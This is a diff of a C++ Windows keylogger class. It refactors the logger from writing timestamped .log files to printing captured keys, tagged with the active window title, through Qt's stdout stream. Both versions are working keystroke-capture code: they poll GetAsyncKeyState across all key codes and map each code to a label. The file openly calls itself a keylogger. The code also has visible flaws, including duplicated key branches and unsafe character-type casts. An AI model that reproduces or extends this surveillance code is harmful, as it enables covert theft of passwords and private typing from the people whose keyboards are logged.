@@ -1,187 +1,123 @@
+#ifdef WIN32
 #include "key_logger.h"
 
-#define FILEEXT ".log"
+#include <QTextStream>
+#include <QString>
 
-#include <iostream>
-#include <sstream>
-#include <fstream>
-#include <time.h>
 #include <windows.h>
 
+QString codeToKey(unsigned char code);
+
 void KeyLogger::log() {
-  string basepath = dirBasename(getSelfPath());
+  QTextStream klogout(stdout, QIODevice::WriteOnly);
 
-  time_t rawtime;
-  struct tm *timeinfo;
-  time(&rawtime);
-  timeinfo = localtime(&rawtime);
-  char filename[MAX_PATH];
-  char filepath[MAX_PATH];
-  strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
-  sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
-
-  cout << filepath << endl; //exit(0);
-
-  string lastTitle = "";
-  ofstream klogout(filepath);
-
-  SHORT lastc = 0;
-  while(1) {
+  while(true) {
     Sleep(2); // give other programs time to run
 
     // get the active windowtitle
     char title[1024];
     HWND hwndHandle = GetForegroundWindow();
     GetWindowText(hwndHandle, (LPWSTR)title, 1023);
-    if(lastTitle != title) {
-      klogout << endl << endl << "Window: ";
-      if(strlen(title) == 0)
-        klogout << "NO ACTIVE WINDOW";
-      else
-        klogout << "'" << title << "'";
-
-      klogout << endl;
-
-      lastTitle = title;
-    }
 
     // logging keys, thats the keylogger
     for(unsigned char c = 1; c < 255; c++) {
       SHORT rv = GetAsyncKeyState(c);
       if(rv & 1) { // on press button down
-        string out = "";
-        if(c == 1)
-          out = "[LMOUSE]"; // mouse left
-        else if(c == 2)
-          out = "[RMOUSE]"; // mouse right
-        else if(c == 4)
-          out = "[MMOUSE]"; // mouse middle
-        else if(c == 13)
-          out = "[RETURN]";
-        else if(c == 16 || c == 17 || c == 18)
-          out = "";
-        else if(c == 160 || c == 161) // lastc == 16
-          out = "[SHIFT]";
-        else if(c == 162 || c == 163) // lastc == 17
-          out = "[STRG]";
-        else if(c == 164) // lastc == 18
-          out = "[ALT]";
-        else if(c == 165)
-          out = "[ALT GR]";
-        else if(c == 8)
-          out = "[BACKSPACE]";
-        else if(c == 9)
-          out = "[TAB]";
-        else if(c == 27)
-          out = "[ESC]";
-        else if(c == 33)
-          out = "[PAGE UP]";
-        else if(c == 34)
-          out = "[PAGE DOWN]";
-        else if(c == 35)
-          out = "[HOME]";
-        else if(c == 36)
-          out = "[POS1]";
-        else if(c == 37)
-          out = "[ARROW LEFT]";
-        else if(c == 38)
-          out = "[ARROW UP]";
-        else if(c == 39)
-          out = "[ARROW RIGHT]";
-        else if(c == 40)
-          out = "[ARROW DOWN]";
-        else if(c == 45)
-          out = "[INS]";
-        else if(c == 46)
-          out = "[DEL]";
-        else if((c >= 65 && c <= 90) || (c >= 48 && c <= 57) || (c == 32))
-          out = c;
-        else if(c == 91 || c == 92)
-          out = "[WIN]";
-        else if(c >= 96 && c <= 105)
-          out = "[NUM " + intToString(c - 96) + "]";
-        else if(c == 106)
-          out = "[NUM /]";
-        else if(c == 107)
-          out = "[NUM +]";
-        else if(c == 109)
-          out = "[NUM -]";
-        else if(c == 109)
-          out = "[NUM ,]";
-        else if(c >= 112 && c <= 123)
-          out = "[F" + intToString(c - 111) + "]";
-        else if(c == 144)
-          out = "[NUM]";
-        else if(c == 192)
-          out = "[OE]";
-        else if(c == 222)
-          out = "[AE]";
-        else if(c == 186)
-          out = "[UE]";
-        else if(c == 186)
-          out = "+";
-        else if(c == 188)
-          out = ",";
-        else if(c == 189)
-          out = "-";
-        else if(c == 190)
-          out = ".";
-        else if(c == 191)
-          out = "#";
-        else if(c == 226)
-          out = "<";
-        else
-          out = "[KEY \\" + intToString(c) + "]";
+        QString key = codeToKey(c);
 
-        cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
-        klogout << out;
-        klogout.flush();
+        klogout << title << ": " << key << endl;
       }
     }
   }
-
-  klogout.close();
 }
 
-string KeyLogger::intToString(int i) {
-  stringstream out;
-  out << "" << i;
-  return out.str();
+QString codeToKey(unsigned char code) {
+  QString key;
+
+  if(code == 1)
+    key.append("[LMOUSE]"); // mouse left
+  else if(code == 2)
+    key.append("[RMOUSE]"); // mouse right
+  else if(code == 4)
+    key.append("[MMOUSE]"); // mouse middle
+  else if(code == 13)
+    key.append("[RETURN]");
+  else if(code == 16 || code == 17 || code == 18)
+    key.append("");
+  else if(code == 160 || code == 161) // lastc == 16
+    key.append("[SHIFT]");
+  else if(code == 162 || code == 163) // lastc == 17
+    key.append("[STRG]");
+  else if(code == 164) // lastc == 18
+    key.append("[ALT]");
+  else if(code == 165)
+    key.append("[ALT GR]");
+  else if(code == 8)
+    key.append("[BACKSPACE]");
+  else if(code == 9)
+    key.append("[TAB]");
+  else if(code == 27)
+    key.append("[ESC]");
+  else if(code == 33)
+    key.append("[PAGE UP]");
+  else if(code == 34)
+    key.append("[PAGE DOWN]");
+  else if(code == 35)
+    key.append("[HOME]");
+  else if(code == 36)
+    key.append("[POS1]");
+  else if(code == 37)
+    key.append("[ARROW LEFT]");
+  else if(code == 38)
+    key.append("[ARROW UP]");
+  else if(code == 39)
+    key.append("[ARROW RIGHT]");
+  else if(code == 40)
+    key.append("[ARROW DOWN]");
+  else if(code == 45)
+    key.append("[INS]");
+  else if(code == 46)
+    key.append("[DEL]");
+  else if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
+    key = code;
+  else if(code == 91 || code == 92)
+    key.append("[WIN]");
+  else if(code >= 96 && code <= 105)
+    key.append("[NUM ").append(code - 96).append("]");
+  else if(code == 106)
+    key.append("[NUM /]");
+  else if(code == 107)
+    key.append("[NUM +]");
+  else if(code == 109)
+    key.append("[NUM -]");
+  else if(code == 109)
+    key.append("[NUM ,]");
+  else if(code >= 112 && code <= 123)
+    key.append("[F").append(code - 111).append("]");
+  else if(code == 144)
+    key.append("[NUM]");
+  else if(code == 192)
+    key.append("[OE]");
+  else if(code == 222)
+    key.append("[AE]");
+  else if(code == 186)
+    key.append("[UE]");
+  else if(code == 186)
+    key.append("+");
+  else if(code == 188)
+    key.append(",");
+  else if(code == 189)
+    key.append("-");
+  else if(code == 190)
+    key.append(".");
+  else if(code == 191)
+    key.append("#");
+  else if(code == 226)
+    key.append("<");
+  else
+    key.append("[KEY \\").append(code).append("]");
+
+  return key;
 }
 
-string KeyLogger::getCurrDir() {
-  string rv = "";
-
-  char *curdir = new char[MAX_PATH];
-  GetCurrentDirectory(MAX_PATH, (LPWSTR)curdir);
-  rv = curdir;
-  delete[] curdir;
-
-  return rv;
-}
-
-string KeyLogger::getSelfPath() {
-  char selfpath[MAX_PATH];
-  GetModuleFileName(NULL, (LPWSTR)selfpath, MAX_PATH);
-  return selfpath;
-}
-
-string KeyLogger::dirBasename(string path) {
-  if(path.empty())
-     return "";
-
-  if(path.find("\\") == string::npos)
-     return path;
-
-  if(path.substr(path.length() - 1) == "\\")
-     path = path.substr(0, path.length() - 1);
-
-  size_t pos = path.find_last_of("\\");
-  if(pos != string::npos)
-     path = path.substr(0, pos);
-
-  if(path.substr(path.length() - 1) == "\\")
-     path = path.substr(0, path.length() - 1);
-
-  return path;
-}
+#endif
